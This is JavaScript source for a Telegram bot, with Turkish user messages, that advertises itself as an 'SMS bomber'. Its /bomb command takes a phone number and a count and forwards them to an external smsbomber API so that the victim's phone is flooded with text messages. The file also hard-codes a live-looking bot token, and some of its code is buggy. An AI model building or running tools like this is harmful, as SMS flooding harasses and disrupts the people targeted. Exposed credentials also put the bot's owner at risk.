const { Telegraf } = require('telegraf');
const { performance } = require('perf_hooks');
const bot = new Telegraf('6357522659:AAFUp0jzOcLBNiNBPGON-SO6srVMC_dqpkw');
const http = require('http');
const fs = require('fs');

bot.command('ban', (ctx) => {
  if (ctx.from_user.id != "6626904056") {
    return;
    }
  const bannedUserId = ctx.message.reply_to_message.from.id;
  
  fs.appendFile('banneds.txt', `\n${bannedUserId}`, (error) => {
    if (error) {
      console.error('Yasaklama işlemi başarısız oldu:', error);
      ctx.reply('Kullanıcı yasaklandı!', error);
    } else {
      console.log('Kullanıcı yasaklandı:', bannedUserId);
      ctx.reply('Kullanıcı yasaklandı!');
    }
  });
});

bot.command("start", (ctx) => {
  const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
  const userId = ctx.message.from.id;

  if (bannedIds.includes(userId.toString())) {
    console.log('Kullanıcı yasaklandı:', userId);
    return ctx.reply('Üzgünüz, yasaklandınız!');
  }

  ctx.replyWithMarkdown(`*Merhaba, SMS bomber botuna hoş geldin!*`
    + `\n_Kullanmak için /bomb <numara> <miktar> yazmanız yeterlidir._`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Ping değerini görüntüle', callback_data: 'ping' }]
      ]
    }
  });
});

bot.action('ping', (ctx) => {
  try {
    const start = performance.now();
    const chatId = ctx.chat.id;
    const messageId = ctx.message.message_id;
    ctx.replyWithMarkdown("*Ping ölçülüyor...*").then(() => {
      const end = performance.now();
      const pingTime = Math.round(end - start);
      const alertText = `Ping değeri: ${pingTime}`;
      ctx.answerCbQuery(alertText, true);
      ctx.deleteMessage(chatId, messageId);
    });
  } catch (error) {
    const start = performance.now();
    const chatId = ctx.chat.id;
    const end = performance.now();
    const pingTime = Math.round(end - start);
    const alertText = `Ping değeri: ${pingTime}`;
    ctx.answerCbQuery(alertText, true);
    // ctx.deleteMessage(chatId, messageId);
  }
});


bot.command("bomb", (ctx, match) => {
  try {
    const bannedIds = fs.readFileSync('banneds.txt', 'utf-8').split('\n');
    const userId = ctx.message.from.id;

    if (bannedIds.includes(userId.toString())) {
      console.log('Kullanıcı yasaklandı:', userId);
      return ctx.reply('Üzgünüz, yasaklandınız!');
    }

    const numara = match[1];
    const miktar = match[2];
    
    http.get(
      `http://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara=${numara}&miktar=${miktar}`,
      (res) => {
        let responseData = '';

        res.on('data', (chunk) => {
          responseData += chunk;
        });

        res.on('end', () => {
          console.log('Alınan metin:', responseData);
          ctx.replyWithHtml(`<b>Sonuç:</b> <code> ${responseData} </code>`);
        });
      }
    );
  } catch (error) {
    try {
      ctx.replyWithHTML(`<b>HATA:</b>\n\n<code> ${error} </code>`);
    } catch (error) {
      console.log(error)
    }
  }
});
bot.launch();